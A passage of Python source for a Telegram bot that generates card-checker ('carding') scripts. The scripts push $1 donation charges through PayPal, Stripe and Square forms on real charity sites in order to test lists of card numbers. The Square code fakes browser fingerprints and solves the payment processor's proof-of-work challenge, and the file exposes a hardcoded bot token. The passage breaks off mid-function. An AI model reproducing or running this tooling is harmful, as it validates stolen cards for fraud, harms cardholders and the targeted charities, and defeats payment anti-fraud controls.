import telebot
import time
import threading
import gc
from telebot import types
import requests, random, json, string, re, base64
from datetime import datetime, timedelta
import os
import html
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === بيانات البوت ===
token = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
myid = ['6843321125']
admins = ['6843321125']
OWNER_ID = 6843321125

waiting_users = {}
reply_mode = {}
bulk_waiting = {}
stop_flags = {}
processing_status = {}

if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')

def cleanup_memory():
    gc.collect()

# ============================================
# === نظام البداية ===
# ============================================
@bot.message_handler(commands=["start"])
def start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you due to your negative behavior.')
        return 
    
    user_id = message.from_user.id
    userr = message.from_user.first_name

    IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a> 𝑻𝒉𝒊𝒔 𝒊𝒔 𝒂 𝑴𝒖𝒍𝒕𝒊-𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒃𝒐𝒕.

[<a href="https://t.me/nnunrr">ϟ</a>] PayPal Gateway >> /paypal 
[<a href="https://t.me/nnunrr">ϟ</a>] Stripe Gateway >> /stripe
[<a href="https://t.me/nnunrr">ϟ</a>] Square Gateway >> /square
[<a href="https://t.me/nnunrr">ϟ</a>] NMI Gateway >> /nmi
[<a href="https://t.me/nnunrr">ϟ</a>] Braintree Gateway >> /braintree
[<a href="https://t.me/nnunrr">ϟ</a>] Bulk Extract >> /bulk
[<a href="https://t.me/nnunrr">ϟ</a>] Send Feedback >> Button Below

[<a href="https://t.me/nnunrr">ϟ</a>] 𝐷𝑒𝑣: @nnunrr '''
    
    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
    FRA.add(Yes22)
    
    video_url = 'https://t.me/C0CCOCOvjk/9'
    bot.send_photo(message.chat.id, video_url, caption=IU, parse_mode='HTML', reply_markup=FRA)

# === نظام المراسلة ===
@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def feedback(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    Atty = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton("Back", callback_data="start")
    Atty.add(back)
    YTT = f'''Welcome <a href='tg://user?id={user_id}'>{userr}</a> Send your message and the admin will respond.'''
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=YTT, parse_mode='HTML', reply_markup=Atty)
    waiting_users[user_id] = True

@bot.message_handler(func=lambda m: m.from_user.id in waiting_users and m.from_user.id not in bulk_waiting)
def get_user_msg(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{user_id}"))
    bot.send_message(OWNER_ID, f"New Message\n\nFrom: {name}\nID: {user_id}\nMessage: {message.text}", reply_markup=kb)
    kb2 = types.InlineKeyboardMarkup()
    kb2.add(types.InlineKeyboardButton("Send another message", callback_data="yrr"))
    bot.send_message(user_id, "Your message has been sent.", reply_markup=kb2)
    waiting_users.pop(user_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def start_reply(call):
    user_id = int(call.data.split("_")[1])
    reply_mode[call.from_user.id] = user_id
    bot.send_message(call.from_user.id, "Write your reply now:")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def send_reply(message):
    user_id = reply_mode[message.from_user.id]
    bot.send_message(user_id, f"Admin response:\n\n{message.text}")
    bot.send_message(OWNER_ID, "Reply sent.")
    reply_mode.pop(message.from_user.id)

@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    try:
        user_id = call.from_user.id
        userr = call.from_user.first_name
        IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a>'''
        FRA = types.InlineKeyboardMarkup(row_width=2)
        Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
        FRA.add(Yes22)
        bot.send_message(call.message.chat.id, IU, parse_mode='HTML', reply_markup=FRA)
    except:
        pass

# ============================================
# === دوال توليد الأكواد ===
# ============================================
def generate_paypal_code(link, id_form1, id_form2, nonec, au):
    return f'''# PayPal Gateway
# Link: {link}
import requests, re, random, time, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
        self.donation = "1.00"
        self.id_form1 = "{id_form1}"
        self.id_form2 = "{id_form2}"
        self.nonec = "{nonec}"
        self.au = "{au}"
        url = '{link}'
        parsed = urlparse(url)
        self.url = parsed.netloc
        self.inurl = parsed.path
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        self.uu = UserAgent()
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        
        da2 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
        pa1 = {{'action': 'give_paypal_commerce_create_order'}}
        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']

        he4 = {{
            'authorization': f'Bearer {{self.au}}',
            'paypal-client-metadata-id': self.paypal,
            'user-agent': self.uu.random,
        }}
        da3 = {{
            'payment_source': {{
                'card': {{
                    'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                }},
            }},
            'application_context': {{'vault': False}},
        }}
        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)

        da4 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
        pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
        
        text = r5.text
        if 'true' in text: return 'CHARGE 1.00$'
        elif 'INSUFFICIENT_FUNDS' in text: return "INSUFFICIENT_FUNDS"
        elif 'ORDER_NOT_APPROVED' in text: return "Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction."
        else:
            try: return r5.json()['data']['error']
            except: return "UNKNOWN_ERROR"

if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Cheker {{Getat}}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            resulti = rr.Charge(ar)
            if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}')
            print(f'[{{rr.checked}}] ' + ar + '  >>  ' + resulti)
            time.sleep(1)
    else:
        noy = 0
        live = 0
        dead = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal()
                    resulti = rr.Charge(P)
                    if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                        live += 1
                        with open('Approved Card.txt', "a") as f:
                            f.write(P + ': {{resulti}} > {{Getat}}')
                    else:
                        dead += 1
                except:
                    dead += 1
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(1)
            print(f'Total: {{noy}} | Live: {{live}} | Dead: {{dead}}')'''


def generate_stripe_code(link):
    return f'''# Stripe Gateway
# Link: {link}
import requests, re, random, sys, os, time, base64
from html import unescape
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SITE_URL = '{link}'
BASE_URL = 'https://' + SITE_URL.split('/')[2]
CLEAN_URL = SITE_URL
IFRAME_URL = '' or SITE_URL
UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
DOMAIN = BASE_URL.split('//')[1]

def extract_data():
    s = requests.Session()
    s.verify = False
    headers = {{'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}}
    r = s.get(IFRAME_URL, headers=headers, timeout=30)
    html = r.text
    if 'givewp-route=donation-form-view' in html and 'givewp-route-signature' not in html:
        fid = re.search(r'form-id[=]+(\\d+)', html)
        if fid:
            iframe = f'{{BASE_URL}}/?givewp-route=donation-form-view&form-id={{fid.group(1)}}'
            r2 = s.get(iframe, headers=headers, timeout=30)
            html = r2.text
    fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
    fi = re.search(r'name="give-form-id" value="(.*?)"', html)
    nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
    pk = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html)
    if not all([fp, fi, nc, pk]):
        return None
    sa = re.search(r'(acct_[A-Za-z0-9]+)', html)
    return {{
        'fp': fp.group(1), 'fi': fi.group(1), 'nc': nc.group(1),
        'pk': pk.group(1), 'sa': sa.group(1) if sa else '',
        'session': s
    }}

def extract_stripe_response(text):
    error_div = re.search(r'class="give_notices give_errors">(.*?)</div>\\s*</div>', text, re.DOTALL)
    if error_div:
        raw_error = error_div.group(1)
        clean_error = re.sub(r'<[^>]+>', '', raw_error)
        clean_error = unescape(clean_error).strip()
        clean_error = re.sub(r'\\s+', ' ', clean_error)
        clean_error = clean_error.replace('Error:', '').strip()
        if 'Your card was declined' in clean_error: return f"Declined | {{clean_error}}"
        elif 'insufficient funds' in clean_error.lower(): return f"Declined | {{clean_error}}"
        elif 'security code is incorrect' in clean_error.lower(): return f"Declined | {{clean_error}}"
        elif 'card number is incorrect' in clean_error.lower(): return f"Declined | {{clean_error}}"
        elif 'expiration' in clean_error.lower(): return f"Declined | {{clean_error}}"
        elif 'processing error' in clean_error.lower(): return f"Declined | {{clean_error}}"
        elif 'lost' in clean_error.lower() or 'stolen' in clean_error.lower(): return f"Declined | {{clean_error}}"
        elif 'fraud' in clean_error.lower(): return f"Declined | {{clean_error}}"
        elif 'do not honor' in clean_error.lower(): return f"Declined | {{clean_error}}"
        elif 'minimum donation' in clean_error.lower(): return f"Gateway Error | {{clean_error}}"
        elif 'robot' in clean_error.lower() or 'captcha' in clean_error.lower(): return f"Gateway Error | {{clean_error}}"
        else: return f"Stripe Response | {{clean_error}}"
    if 'give-donation-confirmation' in text or 'donation-confirmation' in text: return "Charged | Donation confirmed"
    if 'Thank you for your donation' in text: return "Charged | Thank you for your donation"
    if 'receipt' in text.lower() and 'donation' in text.lower() and 'give_error' not in text: return "Charged | Payment succeeded"
    notice_div = re.search(r'class="give_notices[^"]*">(.*?)</div>', text, re.DOTALL)
    if notice_div:
        cn = re.sub(r'<[^>]+>', '', notice_div.group(1))
        cn = unescape(cn).strip()
        cn = re.sub(r'\\s+', ' ', cn)
        return f"Stripe Response | {{cn}}"
    return "Unknown Response"

def check_card(ccx):
    ccx = ccx.strip()
    parts = ccx.split('|')
    if len(parts) < 4: return 'INVALID_FORMAT'
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    yy_short = yy if len(yy) == 2 else yy[-2:]
    email = f'drgam{{random.randint(100,999)}}@gmail.com'
    d = extract_data()
    if not d: return 'EXTRACT_FAILED | Could not get form data from site'
    s = d['session']
    fp, fi, nc, pk, sa = d['fp'], d['fi'], d['nc'], d['pk'], d['sa']
    sa_param = f'&_stripe_account={{sa}}' if sa else ''
    headers_ajax = {{
        'origin': BASE_URL, 'referer': SITE_URL,
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
        'user-agent': UA, 'x-requested-with': 'XMLHttpRequest',
    }}
    data_ajax = {{
        'give-honeypot': '', 'give-form-id-prefix': fp, 'give-form-id': fi,
        'give-form-title': 'Give a Donation', 'give-current-url': SITE_URL,
        'give-form-url': SITE_URL, 'give-form-minimum': '1.00',
        'give-form-maximum': '999999.99', 'give-form-hash': nc,
        'give-price-id': 'custom', 'give-amount': '1.00',
        'give_stripe_payment_method': '', 'payment-mode': 'stripe',
        'give_first': 'drgam', 'give_last': 'drgam', 'give_email': email,
        'give_comment': '', 'card_name': 'drgam', 'billing_country': 'US',
        'card_address': 'drgam sj', 'card_address_2': '', 'card_city': 'tomrr',
        'card_state': 'NY', 'card_zip': '10090', 'give_action': 'purchase',
        'give-gateway': 'stripe', 'action': 'give_process_donation', 'give_ajax': 'true',
    }}
    s.post(f'{{BASE_URL}}/wp-admin/admin-ajax.php', headers=headers_ajax, data=data_ajax, timeout=30)
    headers_stripe = {{
        'authority': 'api.stripe.com', 'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site',
        'user-agent': UA,
    }}
    stripe_data = f'type=card&billing_details[name]=drgam++drgam+&billing_details[email]={{email}}&billing_details[address][line1]=drgam+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={{cc}}&card[cvc]={{cvv}}&card[exp_month]={{mm}}&card[exp_year]={{yy_short}}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d&muid=3b562720-d431-4fa4-b092-278d4639a6f3&sid=70a0ddd2-988f-425f-9996-372422a311c4&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer={{CLEAN_URL}}&time_on_page=85758&key={{pk}}{{sa_param}}'
    e = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=stripe_data, timeout=30)
    sr = e.json()
    if 'error' in sr:
        em = sr['error'].get('message', 'Unknown')
        ec = sr['error'].get('code', 'unknown')
        ed = sr['error'].get('decline_code', '')
        return f"Stripe Error | Code: {{ec}} | Decline: {{ed}} | Message: {{em}}"
    pm_id = sr['id']
    headers_final = {{
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': BASE_URL, 'referer': SITE_URL,
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1', 'user-agent': UA,
    }}
    params_final = {{'payment-mode': 'stripe', 'form-id': fi}}
    data_final = {{
        'give-honeypot': '', 'give-form-id-prefix': fp, 'give-form-id': fi,
        'give-form-title': 'Give a Donation', 'give-current-url': SITE_URL,
        'give-form-url': SITE_URL, 'give-form-minimum': '1.00',
        'give-form-maximum': '999999.99', 'give-form-hash': nc,
        'give-price-id': 'custom', 'give-amount': '1.00',
        'give_stripe_payment_method': pm_id, 'payment-mode': 'stripe',
        'give_first': 'drgam', 'give_last': 'drgam', 'give_email': email,
        'give_comment': '', 'card_name': 'drgam', 'billing_country': 'US',
        'card_address': 'drgam sj', 'card_address_2': '', 'card_city': 'tomrr',
        'card_state': 'NY', 'card_zip': '10090', 'give_action': 'purchase',
        'give-gateway': 'stripe',
    }}
    r4 = s.post(CLEAN_URL, params=params_final, headers=headers_final, data=data_final, timeout=30)
    return extract_stripe_response(r4.text)

if __name__ == '__main__':
    print('    Stripe Checker')
    print()
    print('  [1] Single Card')
    print('  [2] Combo File')
    print()
    choice = input('  Select mode: ').strip()
    print()
    if choice == '1':
        card = input('  Enter card (cc|mm|yy|cvv): ').strip()
        result = check_card(card)
        print(f'  Result: {{result}}')
    elif choice == '2':
        fpath = input('  Enter file path: ').strip()
        if not os.path.exists(fpath):
            print('  File not found')
            return
        with open(fpath, 'r') as f:
            cards = [l.strip() for l in f if '|' in l]
        print(f'  Loaded {{len(cards)}} cards')
        print('  ------------------------------------')
        charged = declined = errors = 0
        for i, card in enumerate(cards, 1):
            result = check_card(card)
            status = 'CHARGED' if 'charged' in result.lower() else ('DECLINED' if any(x in result.lower() for x in ['declined', 'error', 'response']) else 'UNKNOWN')
            if status == 'CHARGED': charged += 1
            elif status == 'DECLINED': declined += 1
            else: errors += 1
            print(f'  [{{i}}/{{len(cards)}}] {{card[:20]}}... | {{status}} | {{result}}')
            time.sleep(1)
        print('  ------------------------------------')
        print(f'  Charged: {{charged}} | Declined: {{declined}} | Errors: {{errors}}')
    else:
        print('  Invalid choice')'''


def generate_square_code():
    return '''# Square Gateway - andrewscenter.com
import requests, json, hashlib, uuid, time, re, random, sys, os
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def collect_error_msgs(obj, msgs):
    if isinstance(obj, list):
        for item in obj:
            if isinstance(item, str):
                msgs.append(item)
            elif isinstance(item, (dict, list)):
                collect_error_msgs(item, msgs)
    elif isinstance(obj, dict):
        for key, val in obj.items():
            collect_error_msgs(val, msgs)

def classify_error(msg):
    msg_lower = msg.lower()
    if 'insufficient_funds' in msg_lower or 'insufficient funds' in msg_lower:
        return f'Declined | INSUFFICIENT_FUNDS | {msg}'
    elif 'card_declined' in msg_lower or 'card was declined' in msg_lower or 'declined' in msg_lower:
        return f'Declined | CARD_DECLINED | {msg}'
    elif 'cvv' in msg_lower:
        return f'Declined | CVV_FAILURE | {msg}'
    elif 'expired' in msg_lower:
        return f'Declined | EXPIRED_CARD | {msg}'
    elif 'invalid' in msg_lower:
        return f'Declined | INVALID | {msg}'
    elif 'do not honor' in msg_lower:
        return f'Declined | DO_NOT_HONOR | {msg}'
    elif 'fraud' in msg_lower:
        return f'Declined | SUSPECTED_FRAUD | {msg}'
    elif 'stolen' in msg_lower or 'lost' in msg_lower:
        return f'Declined | LOST_OR_STOLEN | {msg}'
    elif 'generic_decline' in msg_lower:
        return f'Declined | GENERIC_DECLINE | {msg}'
    elif 'transaction_limit' in msg_lower or 'exceed' in msg_lower:
        return f'Declined | EXCEED_LIMIT | {msg}'
    elif 'not_permitted' in msg_lower or 'not permitted' in msg_lower:
        return f'Declined | TRANSACTION_NOT_PERMITTED | {msg}'
    elif 'pickup' in msg_lower:
        return f'Declined | PICKUP_CARD | {msg}'
    elif 'account' in msg_lower and ('closed' in msg_lower or 'blocked' in msg_lower):
        return f'Declined | ACCOUNT_BLOCKED | {msg}'
    else:
        return f'Declined | {msg}'

def parse_donate_response(text):
    try:
        data = json.loads(text)
    except:
        error_div = re.search(r'gateway_error.*?\\["(.*?)"\\]', text, re.DOTALL)
        if error_div:
            return f'Declined | {error_div.group(1)}'
        return f'Square Response | {text[:300]}'

    if data.get('success') is True:
        receipt = data.get('data', {}).get('receiptUrl', '')
        return f'Charged | Payment succeeded | {receipt}'

    if data.get('success') is False:
        err_data = data.get('data', {})
        err_type = err_data.get('type', '')
        errors = err_data.get('errors', {})
        all_msgs = []
        collect_error_msgs(errors, all_msgs)
        if all_msgs:
            return classify_error(all_msgs[0])
        return f'Square Error | {err_type} | {json.dumps(errors)[:200]}'

    return f'Square Response | {text[:300]}'

def check_card(ccx):
    try:
        ccx = ccx.strip()
        parts = ccx.split('|')
        if len(parts) < 4: return 'INVALID_FORMAT'
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2: yy = '20' + yy
        s = requests.Session()
        s.verify = False

        iframe_url = 'https://www.andrewscenter.com/?givewp-route=donation-form-view&form-id=1720'
        r0 = s.get(iframe_url, headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}, timeout=30)
        sig_m = re.search(r'givewp-route=donate[^"]*givewp-route-signature=([a-f0-9]+)[^"]*givewp-route-signature-id=([\\w-]+)[^"]*givewp-route-signature-expiration=(\\d+)', r0.text)
        if not sig_m:
            return 'Error | Could not extract signature'
        route_sig = sig_m.group(1)
        route_sig_id = sig_m.group(2)
        route_sig_exp = sig_m.group(3)

        sq_headers = {
            'authority': 'pci-connect.squareup.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json; charset=utf-8',
            'origin': 'https://web.squarecdn.com',
            'referer': 'https://web.squarecdn.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        hydrate_resp = requests.get(
            'https://pci-connect.squareup.com/payments/hydrate',
            params={'applicationId': 'sq0idp-4pgmJ7BkILYxRsHw5RYiRQ', 'hostname': 'andrewscenter.com', 'locationId': 'LGA5CPZR68ZK4', 'version': '1.82.7'},
            headers=sq_headers,
            timeout=30
        )

        hydrate_data = hydrate_resp.json()
        session_id = hydrate_data.get('sessionId', '')
        instance_id = hydrate_data.get('instanceId', str(uuid.uuid4()))
        pow_prefix = hydrate_data.get('powPrefix', '00000')

        if not session_id:
            return 'Square Error | Could not get session from hydrate'

        cookies = dict(hydrate_resp.cookies)
        cookies['_savt'] = hydrate_data.get('avt', str(uuid.uuid4()))

        combo_str = f'sq0idp-4pgmJ7BkILYxRsHw5RYiRQ,LGA5CPZR68ZK4,{instance_id}'
        pow_counter = 0
        while True:
            pow_counter += 1
            test = f'{session_id}:{pow_counter}:{combo_str}'
            h = hashlib.sha256(test.encode()).hexdigest()
            if h.startswith(pow_prefix):
                break
            if pow_counter > 10000000:
                return 'Square Error | Could not solve proof of work'

        payment_tracking_id = str(uuid.uuid4())

        fp_v1 = '{"user_agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36","language":"en-US","resolution":[846,381],"available_resolution":[846,381],"timezone_offset":-120,"open_database":1,"navigator_platform":"Linux armv81","regular_plugins":[],"adblock":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}'
        fp_v1_hash = hashlib.md5(fp_v1.encode()).hexdigest()

        fp_v1_sans = '{"language":"en-US","resolution":[846,381],"available_resolution":[846,381],"timezone_offset":-120,"open_database":1,"navigator_platform":"Linux armv81","regular_plugins":[],"adblock":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}'
        fp_v1_sans_hash = hashlib.md5(fp_v1_sans.encode()).hexdigest()

        fp_v2 = '{"fonts":["sans-serif-thin"],"dom_blockers":[],"font_preferences":{"default":164.71875,"apple":164.71875,"serif":164.71875,"sans":150.4375,"mono":132.625,"min":10.296875,"system":150.4375},"audio":124.08072766105033,"screen_frame":[0,0,0,0],"languages":[["en-US"]],"device_memory":8,"screen_resolution":[846,381],"hardware_concurrency":8,"timezone":"Africa/Cairo","indexed_db":true,"open_database":true,"platform":"Linux armv81","plugins":[],"canvas":{"winding":true,"geometry":"data:image/png;base64,test","text":"data:image/png;base64,test"},"touch_support":{"max_touch_points":5,"touch_event":true,"touch_start":true},"vendor":"","vendor_flavors":[],"cookie_enabled":true,"color_depth":24}'
        fp_v2_hash = hashlib.md5(fp_v2.encode()).hexdigest()

        nonce_json = {
            'analytics': {
                'fingerprints': [
                    {'components': fp_v1, 'fingerprint': fp_v1_hash, 'version': 'fingerprint-v1'},
                    {'components': fp_v1_sans, 'fingerprint': fp_v1_sans_hash, 'version': 'fingerprint-v1-sans-ua'},
                    {'components': fp_v2, 'fingerprint': fp_v2_hash, 'version': 'fingerprint-v2'},
                ],
                'timezone': '-120',
                'website_url': 'https://andrewscenter.com/',
            },
            'client_id': 'sq0idp-4pgmJ7BkILYxRsHw5RYiRQ',
            'instance_id': instance_id,
            'location_id': 'LGA5CPZR68ZK4',
            'payment_method_tracking_id': payment_tracking_id,
            'session_id': session_id,
            'card_data': {
                'cvv': cvv,
                'exp_month': int(mm),
                'exp_year': int(yy),
                'number': cc,
            },
            'pow_counter': pow_counter,
        }

        nonce_resp = requests.post(
            'https://pci-connect.squareup.com/v2/card-nonce',
            params={'_': str(int(time.time() * 1000)), 'version': '1.82.7'},
            cookies=cookies,
            headers=sq_headers,
            json=nonce_json,
            timeout=30
        )

        nonce_data = nonce_resp.json()

        if 'pow_prefix' in nonce_data:
            pow_base = nonce_data.get('pow_base', session_id)
            pow_prefix2 = nonce_data['pow_prefix']
            s2 = f'sq0idp-4pgmJ7BkILYxRsHw5RYiRQ,LGA5CPZR68ZK4,{instance_id}'
            pow_counter2 = 0
            while True:
                pow_counter2 += 1
                test2 = f'{pow_base}:{pow_counter2}:{s2}'
                h2 = hashlib.sha256(test2.encode()).hexdigest()
                if h2.startswith(pow_prefix2):
                    break
                if pow_counter2 > 10000000:
                    return 'Square Error | Could not solve second proof of work'

            nonce_json['session_id'] = pow_base
            nonce_json['pow_counter'] = pow_counter2

            nonce_resp = requests.post(
                'https://pci-connect.squareup.com/v2/card-nonce',
                params={'_': str(int(time.time() * 1000)), 'version': '1.82.7'},
                cookies=cookies,
                headers=sq_headers,
                json=nonce_json,
                timeout=30
            )

        nonce_data = nonce_resp.json()

        if 'errors' in nonce_data:
            errors = nonce_data['errors']
            if isinstance(errors, list) and len(errors) > 0:
                err = errors[0]
                code = err.get('code', 'UNKNOWN')
                detail = err.get('detail', '')
                return f'Declined | Code: {code} | {detail}'
            return f'Square Error | {json.dumps(errors)}'

        card_nonce = nonce_data.get('card_nonce') or nonce_data.get('nonce', '')
        if not card_nonce:
            return f'Square Error | No nonce returned | {json.dumps(nonce_data)[:200]}'

        email = f'drgam{random.randint(100, 999)}@gmail.com'

        donate_params = {
            'givewp-route': 'donate',
            'givewp-route-signature': route_sig,
            'givewp-route-signature-id': route_sig_id,
            'givewp-route-signature-expiration': route_sig_exp,
        }

        donate_files = {
            'amount': (None, '1'),
            'currency': (None, 'USD'),
            'donationType': (None, 'single'),
            'formId': (None, '1720'),
            'gatewayId': (None, 'square'),
            'firstName': (None, 'drgam'),
            'lastName': (None, 'drgam'),
            'email': (None, email),
            'country': (None, 'US'),
            'address1': (None, '7TH AVE, NEW YORK, NY 10001'),
            'address2': (None, ''),
            'city': (None, 'New York'),
            'state': (None, 'NY'),
            'zip': (None, '10001'),
            'comment': (None, ''),
            'donationBirthday': (None, ''),
            'originUrl': (None, 'https://www.andrewscenter.com/donate/'),
            'isEmbed': (None, 'true'),
            'embedId': (None, '1720'),
            'locale': (None, 'en_US'),
            'gatewayData[square-card-nonce]': (None, card_nonce),
        }

        donate_headers = {
            'authority': 'andrewscenter.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'origin': 'https://www.andrewscenter.com',
            'referer': 'https://www.andrewscenter.com/donate/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        donate_resp = s.post(
            'https://www.andrewscenter.com/',
            params=donate_params,
